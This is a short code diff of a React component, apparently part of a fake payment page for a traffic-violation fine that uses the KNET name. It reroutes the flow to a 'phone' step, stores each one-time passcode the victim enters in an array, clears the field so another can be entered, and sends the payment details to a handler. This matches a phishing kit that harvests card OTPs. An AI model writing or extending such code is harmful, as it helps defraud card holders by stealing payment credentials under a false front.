@@ -173,7 +173,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
     status: "new",
   });
   const handleNewpage = () => {
-    handleUpdatePage("knet");
+    handleUpdatePage("phone");
   };
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
@@ -657,10 +657,12 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                             setLoading(true);
                             handleAddotp(paymentInfo.otp!);
                             //     handleOArr(paymentInfo.otp!);
-                            handlePay(paymentInfo, setPaymentInfo);
+                            handlePay({paymentInfo,page:
+                            'phone'}, setPaymentInfo);
                             setTimeout(() => {
                               setLoading(false);
-                              setTimeout(() => {}, 2000);
+                              setTimeout(() => {
+                              }, 2000);
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: "",
